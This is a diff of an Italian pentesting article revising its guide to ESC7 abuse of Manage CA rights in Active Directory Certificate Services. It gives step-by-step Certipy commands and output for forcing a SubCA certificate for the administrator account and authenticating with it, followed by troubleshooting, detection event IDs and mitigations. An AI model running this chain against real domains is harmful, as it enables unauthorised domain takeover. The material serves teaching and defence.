@@ -1,10 +1,7 @@
 ---
-title: 'ESC7 ADCS: Privilege Escalation Tramite Manage CA su Active Directory'
+title: 'ESC7 AD CS: Certipy, Manage CA e Privilege Escalation'
 slug: esc7-adcs
-description: >-
-  ESC7 su AD CS permette privilege escalation abusando dei permessi Manage CA e
-  Manage Certificates. Guida pratica con Certipy per ottenere certificati
-  Administrator.
+description: 'Scopri ESC7 in AD CS: sfrutta i permessi Manage CA con Certipy e privesc, verificare il percorso SubCA e applicare detection e mitigazioni in ambienti AD.'
 image: /esc7.webp
 draft: false
 date: 2026-03-07T00:00:00.000Z
@@ -13,23 +10,27 @@ categories:
 subcategories:
   - privilege-escalation
 tags:
-  - ad
-  - adcs
-  - esc
-  - certipy
+  - ESC7
+  - Manage CA
+  - Manage Certificates
+  - SubCA
+  - Certipy
 ---
 
-ESC7 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che deriva da permessi pericolosi direttamente sulla **Certificate Authority**. In particolare quando un attaccante ottiene diritti come **Manage CA** o **Manage Certificates**, che permettono di controllare il comportamento della CA e il processo di emissione dei certificati.
+# ESC7 in Active Directory Certificate Services: abuso dei permessi Manage CA e Manage Certificates
 
-Il permesso **Manage CA (ManageCa)** è il più critico. Consente di modificare la configurazione della CA, pubblicare template, assegnare ruoli (come Certificate Officer), avviare o fermare il servizio CA e modificare la sicurezza. Con questo livello di accesso un attaccante può forzare l'emissione di certificati arbitrari e ottenere accesso completo al dominio.
+ESC7 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che nasce da permessi eccessivi direttamente sulla **Certificate Authority** — non su un singolo template come in [ESC4](https://hackita.it/articoli/esc4-adcs/), ma sulla CA stessa. I due permessi coinvolti sono **Manage CA** e **Manage Certificates**, e vanno distinti con più precisione di quanto si legge spesso: non sono intercambiabili, e nessuno dei due garantisce da solo il controllo completo del dominio.
 
-Il permesso **Manage Certificates (Certificate Officer)** permette invece di approvare o rifiutare richieste di certificati. Da solo non sempre porta a escalation immediata, ma combinato con altri fattori può permettere l'emissione di certificati per account privilegiati.
+## Due permessi, due capacità diverse
 
-***
+| Permesso                                                                    | Cosa permette davvero                                                                                                                                 | Limiti da verificare                                                                                                                               |
+| --------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Manage CA (`ManageCa`)**                                                  | Modificare la configurazione della CA, pubblicare/abilitare template, assegnare ruoli (es. Certificate Officer), intervenire sulla sicurezza della CA | Quali operazioni sono effettivamente consentite nell'ambiente, e se è attiva una separazione dei ruoli che limita cosa un singolo account può fare |
+| **Manage Certificates (`ManageCertificates`, ruolo "Certificate Officer")** | Approvare, negare o revocare richieste di certificato secondo le capacità del ruolo                                                                   | L'operatività dipende dalle richieste effettivamente gestibili — non equivale a poter cambiare la configurazione della CA                          |
+
+Microsoft consiglia di mantenere questi due ruoli separati (role separation) proprio perché insieme costituiscono un controllo molto ampio sul processo di emissione — ma **Manage CA non equivale a Domain Admin**: il permesso rappresenta un rischio molto alto perché agisce su un'infrastruttura fidata (asset Tier-0), non un accesso amministrativo di dominio già ottenuto. L'identità e i privilegi che se ne ricavano dipendono dal completamento dell'intera catena, non dal solo possesso del permesso.
 
 ## Identificazione con Certipy
-
-Certipy può individuare ESC7 enumerando i permessi sulla CA.
 
 ```bash
 certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -vulnerable -enabled -stdout
@@ -45,8 +46,8 @@ Certificate Authorities
   Permissions
     Access Rights
       ManageCa                        : CORP.LOCAL\Authenticated Users
-                                        CORP.LOCAL\Domain Admins
-                                        CORP.LOCAL\Enterprise Admins
+                                         CORP.LOCAL\Domain Admins
+                                         CORP.LOCAL\Enterprise Admins
 
   [+] User ACL Principals             : CORP.LOCAL\Authenticated Users
 
@@ -54,171 +55,175 @@ Certificate Authorities
     ESC7                              : User has dangerous permissions.
 ```
 
-Indicatori chiave:
+`User ACL Principals` indica attraverso quali principal Certipy ha rilevato i tuoi diritti sulla CA (direttamente o via gruppi) — vale la pena verificarlo, non limitarsi a leggere "ESC7" nell'output.
 
-* `ManageCa` assegnato a gruppi troppo ampi
-* `[!] Vulnerabilities ESC7`
-* `User ACL Principals` indica che l'utente corrente possiede questi diritti
+## Exploitation: il percorso con il template SubCA
 
-***
+Uno dei metodi più diretti sfrutta il template built-in **SubCA**, che permette al richiedente di specificare il subject e ha EKU molto permissivi — ma richiede comunque `Manage CA` sulla CA specifica, non un generico accesso al dominio.
 
-## Exploit ESC7 ADCS con Certipy
-
-Uno dei metodi più efficaci sfrutta il template **SubCA**, che permette di specificare il subject e possiede EKU molto permissivi.
-
-L'attaccante utilizza i permessi **Manage CA** per:
-
-1. aggiungersi come Certificate Officer
-2. abilitare il template SubCA
-3. inviare una richiesta certificato
-4. approvarla manualmente
-5. recuperare il certificato
-
-***
-
-### Step 1 — Aggiungi te stesso come officer
+**Step 1 — Aggiungiti come Certificate Officer**
 
 ```bash
 certipy ca \
-    -u 'attacker@corp.local' -p 'Passw0rd!' \
-    -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
-    -ca 'CORP-CA' -add-officer 'attacker'
+  -u 'attacker@corp.local' -p 'Passw0rd!' \
+  -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
+  -ca 'CORP-CA' -add-officer 'attacker'
 ```
 
-***
+```
+[*] Successfully added officer 'attacker' on 'CORP-CA'
+```
 
-### Step 2 — Abilita il template SubCA
+**Step 2 — Abilita il template SubCA sulla CA**
 
 ```bash
 certipy ca \
-    -u 'attacker@corp.local' -p 'Passw0rd!' \
-    -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
-    -ca 'CORP-CA' -enable-template 'SubCA'
+  -u 'attacker@corp.local' -p 'Passw0rd!' \
+  -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
+  -ca 'CORP-CA' -enable-template 'SubCA'
 ```
 
-***
+```
+[*] Successfully enabled 'SubCA' on 'CORP-CA'
+```
 
-### Step 3 — Richiedi certificato come Administrator
+**Step 3 — Richiedi il certificato: la richiesta viene negata, ma non è un fallimento**
 
 ```bash
 certipy req \
-    -u 'attacker@corp.local' -p 'Passw0rd!' \
-    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-    -ca 'CORP-CA' -template 'SubCA' \
-    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
+  -u 'attacker@corp.local' -p 'Passw0rd!' \
+  -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
+  -ca 'CORP-CA' -template 'SubCA' \
+  -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
 ```
 
-Output tipico:
-
 ```
-Request ID is 1
-CERTSRV_E_TEMPLATE_DENIED
+[*] Requesting certificate via RPC
+[*] Request ID is 1
+[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
 Would you like to save the private key? (y/N): y
-Saving private key to '1.key'
+[*] Saving private key to '1.key'
 ```
 
-La richiesta viene rifiutata ma genera **Request ID** e salva la chiave privata.
+**Cosa significa davvero `CERTSRV_E_TEMPLATE_DENIED`**: non è "la richiesta è in attesa di manager approval" — è un diniego per **mancanza di diritti di enrollment** sul template `SubCA` (abilitarlo sulla CA non ti dà automaticamente il permesso di richiederlo). Nonostante il diniego, la CA assegna comunque un **Request ID** e registra la richiesta, e Certipy salva la chiave privata generata localmente (`1.key`) — questo è esattamente il presupposto che rende possibile lo step successivo: userai `Manage CA` per *forzare* l'emissione di una richiesta già registrata, non per correggere i permessi del template.
 
-***
-
-### Step 4 — Approva la richiesta
+**Step 4 — Usa Manage CA per emettere la richiesta negata**
 
 ```bash
 certipy ca \
-    -u 'attacker@corp.local' -p 'Passw0rd!' \
-    -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
-    -ca 'CORP-CA' -issue-request '1'
+  -u 'attacker@corp.local' -p 'Passw0rd!' \
+  -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
+  -ca 'CORP-CA' -issue-request '1'
 ```
 
-***
+```
+[*] Successfully issued certificate request ID 1
+```
 
-### Step 5 — Recupera il certificato
+**Step 5 — Recupera il certificato**
 
 ```bash
 certipy req \
-    -u 'attacker@corp.local' -p 'Passw0rd!' \
-    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-    -ca 'CORP-CA' -retrieve '1'
+  -u 'attacker@corp.local' -p 'Passw0rd!' \
+  -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
+  -ca 'CORP-CA' -retrieve '1'
 ```
 
-Output:
-
 ```
-Got certificate with UPN 'administrator@corp.local'
-Saving certificate and private key to 'administrator.pfx'
+[*] Retrieving certificate with ID 1
+[*] Got certificate with UPN 'administrator@corp.local'
+[*] Certificate object SID is 'S-1-5-21-...-500'
+[*] Loaded private key from '1.key'
+[*] Saving certificate and private key to 'administrator.pfx'
 ```
 
-Ora l'attaccante possiede **administrator.pfx**.
+Nota la riga `Certificate object SID is ...`: è la prima verifica da fare, **prima** di passare all'autenticazione — confirma che il certificato recuperato porta davvero il SID del target previsto, non solo l'UPN. Se non trovi il file `1.key` nella directory corrente, Certipy lo cerca automaticamente in base al Request ID; se non lo trova, verifica di essere nella stessa directory dello Step 3 o passa il percorso esplicitamente.
 
-***
-
-### Autenticazione
+**Autenticazione**
 
 ```bash
 certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
 ```
 
-Risultato:
+### Cosa dimostra ogni risultato — non fermarti al certificato emesso
 
-* **TGT Kerberos**
-* **NT hash Administrator**
-* controllo completo del dominio
+| Risultato                                    | Cosa confirma                                                  | Cosa NON confirma                                                                                                               |
+| -------------------------------------------- | -------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
+| Certificato recuperato (`administrator.pfx`) | Il percorso di emissione forzata è andato a buon fine          | Che il KDC accetterà quel certificato per il logon                                                                              |
+| `Certificate object SID` corretto            | Il certificato porta l'identità attesa                         | Il mapping finale sul Domain Controller                                                                                         |
+| `Got TGT`                                    | L'autenticazione Kerberos è riuscita per il principal indicato | Il recupero dell'hash NT                                                                                                        |
+| `Got NT hash`                                | È stata recuperata quella specifica informazione               | Accesso amministrativo su ogni sistema del dominio                                                                              |
+| Autenticazione negata dal KDC                | —                                                              | Verifica il mapping del certificato e la configurazione di strong certificate mapping sul DC, non è un fallimento di ESC7 in sé |
+
+Un certificato emesso correttamente non garantisce automaticamente che l'autenticazione riesca: dipende anche dal certificate mapping configurato sul Domain Controller.
+
+## Varianti: Manage CA non porta solo a SubCA
+
+Il percorso SubCA è il più diretto da documentare, ma `Manage CA` abilita anche altri scenari, che vale la pena conoscere senza trasformare questo articolo in una guida a tutto AD CS:
+
+| Variante                                         | Relazione con ESC7                                                                                                                                                                              |
+| ------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Pubblicazione di un template vulnerabile         | `Manage CA` può rendere disponibile un template — l'abilitazione in sé non lo rende automaticamente sfruttabile, serve che quel template abbia anche una propria misconfigurazione              |
+| [ESC6](https://hackita.it/articoli/esc6-adcs/)   | Manage CA può permettere di modificare la configurazione che abilita la SAN injection a livello di CA                                                                                           |
+| [ESC11](https://hackita.it/articoli/esc11-adcs/) | Il controllo della CA incide sulle impostazioni di protezione delle richieste RPC — l'abuso dipende dalla configurazione effettiva del servizio                                                 |
+| [ESC16](https://hackita.it/articoli/esc16-adcs/) | Manage CA può incidere sull'inclusione della Security Extension nei certificati emessi                                                                                                          |
+| Solo `Manage Certificates`                       | Percorso più limitato: puoi approvare/negare/revocare richieste esistenti, ma non modificare la configurazione della CA — l'escalation dipende da quali richieste sono effettivamente gestibili |
+
+## Troubleshooting
+
+| Sintomo                                           | Cosa verificare                                                                                                                                                                                             |
+| ------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| ESC7 non compare nell'output di Certipy           | Versione dello strumento, identità usata, appartenenza a gruppi, CA interrogata                                                                                                                             |
+| `-add-officer` fallisce                           | Diritti `Manage CA` effettivi, nome dell'identità target corretto                                                                                                                                           |
+| `-enable-template SubCA` fallisce                 | Permessi sulla CA, nome esatto del template, disponibilità nell'ambiente                                                                                                                                    |
+| La richiesta (Step 3) non genera un Request ID    | Verifica la raggiungibilità della CA e il tipo di errore — un errore diverso da `CERTSRV_E_TEMPLATE_DENIED` può indicare un problema diverso (CA non raggiungibile, template non abilitato)                 |
+| `-issue-request` non produce un certificato       | Verifica il Request ID corretto e di avere ancora i diritti `Manage CA`/`Manage Certificates` necessari                                                                                                     |
+| `-retrieve` non trova la chiave privata           | Verifica la presenza di `<ID>.key` nella directory corrente o il Request ID usato                                                                                                                           |
+| Certificato recuperato ma `certipy auth` fallisce | Verifica il SID nel certificato, il mapping sul DC, la catena di fiducia — vedi [ESC9](https://hackita.it/articoli/esc9-adcs/)/[ESC10](https://hackita.it/articoli/esc10-adcs/) se il problema è di mapping |
+| TGT ottenuto ma accesso a una risorsa negato      | Verifica i privilegi effettivi dell'account impersonato su quella risorsa specifica                                                                                                                         |
+
+## Detection
+
+Non limitarti a verificare quali permessi esistono — serve monitorare le modifiche effettive. Richiede auditing configurato sia sul filtro della CA sia tramite Advanced Audit Policy del sistema operativo:
+
+| Evento          | Significato                                                       |
+| --------------- | ----------------------------------------------------------------- |
+| **4882**        | Modifica delle autorizzazioni della CA                            |
+| **4885**        | Modifica del filtro di auditing della CA                          |
+| **4886**        | Richiesta di certificato ricevuta                                 |
+| **4887**        | Certificato emesso                                                |
+| **4888**        | Richiesta negata                                                  |
+| **4890**        | Modifica delle impostazioni del Certificate Manager               |
+| **4891 / 4892** | Modifica di una voce di configurazione / delle proprietà della CA |
+| **4896**        | Eliminazione di record nel database della CA                      |
+| **4897**        | Abilitazione della role separation                                |
+
+La correlazione più utile per ESC7: una richiesta inizialmente negata (`CERTSRV_E_TEMPLATE_DENIED`, evento 4888) seguita a breve da un'emissione amministrativa (evento 4887 tramite `-issue-request`) non prevista dal normale processo di approvazione.
+
+## Mitigation
+
+* **Trattare la CA come asset Tier-0**: isolamento, accesso amministrativo limitato come per un Domain Controller.
+* **Limitare `Manage CA` e `Manage Certificates` a pochi amministratori PKI dedicati** — non assegnarli a gruppi ampi o, peggio, a `Authenticated Users`.
+* **Abilitare la role separation** quando possibile, per impedire che lo stesso account possa sia configurare la CA sia gestire le richieste.
+* **Auditare periodicamente i template pubblicati** sulla CA e chi può abilitarli.
+* **Monitorare la sequenza "diniego → emissione amministrativa"** descritta sopra, non solo l'esistenza dei permessi.
+
+## FAQ
+
+**Cos'è ESC7?**
+L'abuso dei permessi amministrativi sulla Certificate Authority — tipicamente `Manage CA`, talvolta `Manage Certificates` — per forzare l'emissione di un certificato che il template non avrebbe altrimenti concesso.
+
+**ESC7 porta sempre a Domain Admin?**
+Può, quando l'intera catena si completa: controllo della CA, emissione forzata di un certificato per un account privilegiato, e autenticazione accettata dal KDC. Non è un risultato garantito dal solo possesso di `Manage CA`.
+
+**Qual è la differenza tra ESC7 ed ESC4?**
+[ESC4](https://hackita.it/articoli/esc4-adcs/) riguarda permessi pericolosi su un **singolo template**; ESC7 riguarda permessi pericolosi sulla **CA stessa**, che può incidere su tutti i template che vi sono pubblicati — ma non equivale a controllare automaticamente ogni altro oggetto o servizio PKI del dominio.
+
+**`Manage Certificates` da solo basta per l'escalation?**
+Non sempre: dipende da quali richieste sono effettivamente gestibili con quel ruolo. Spesso serve in combinazione con altri fattori (es. una richiesta già pendente per un template che potresti far approvare).
 
 ***
 
-## Detection ESC7 ADCS
+Guida completa a tutte le tecniche ESC1–ESC16: [AD CS Privilege Escalation con Certipy](https://hackita.it/articoli/adcs-esc1-esc16/). Tecniche correlate: [ESC8](https://hackita.it/articoli/esc8-adcs/), [ESC9](https://hackita.it/articoli/esc9-adcs/).
 
-Controllare:
-
-* permessi `ManageCa`
-* permessi `ManageCertificates`
-* template pubblicati sulla CA
-
-Eventi utili:
-
-* modifiche configurazione CA
-* emissione certificati sospetti
-
-***
-
-## Mitigation ESC7 ADCS
-
-La Certificate Authority è un asset **Tier-0**.
-
-Misure principali:
-
-* limitare **Manage CA** e **Manage Certificates** a pochi amministratori PKI
-* non assegnare questi permessi a gruppi ampi
-* monitorare modifiche ai template e richieste certificate
-
-***
-
-## FAQ — ESC7 ADCS
-
-### Cos'è ESC7 in ADCS?
-
-ESC7 è l'abuso dei permessi amministrativi sulla Certificate Authority, in particolare **Manage CA**.
-
-### ESC7 permette Domain Admin?
-
-Sì. Un attaccante può forzare l'emissione di certificati per utenti privilegiati.
-
-### Qual è la differenza tra ESC7 e ESC4?
-
-[ESC4](/articoli/esc4-adcs/) modifica un singolo template.
-ESC7 compromette direttamente la **Certificate Authority**.
-
-***
-
-**Key Takeaway:** se un attaccante ottiene **Manage CA**, può manipolare l'intera infrastruttura AD CS ed emettere certificati arbitrari per qualsiasi utente.
-
-***
-
-> ESC7 mostra quanto sia critica la sicurezza della Certificate Authority. Per vedere tutte le tecniche certificate attack leggi la guida completa:
-> [https://hackita.it/articoli/adcs-esc1-esc16](/articoli/adcs-esc1-esc16/)Continua con le escalation successive:
-> [https://hackita.it/articoli/esc8-adcs](/articoli/esc8-adcs/) · [https://hackita.it/articoli/esc9-adcs](/articoli/esc9-adcs/)Se questo contenuto ti è utile puoi supportare il progetto HackIta su
-> [https://hackita.it/supporto](/supporto)Vuoi imparare pentesting Active Directory oppure testare la sicurezza della tua infrastruttura?
-> [https://hackita.it/servizi](/servizi)Riferimenti tecnici:
-> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
-> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
-> [https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/)
+Fonti tecniche: [Certipy — Privilege Escalation Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation), [Microsoft Learn — Secure, Delegate, and Audit Certification Authority Administration](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/secure-delegate-audit-certification-authority).
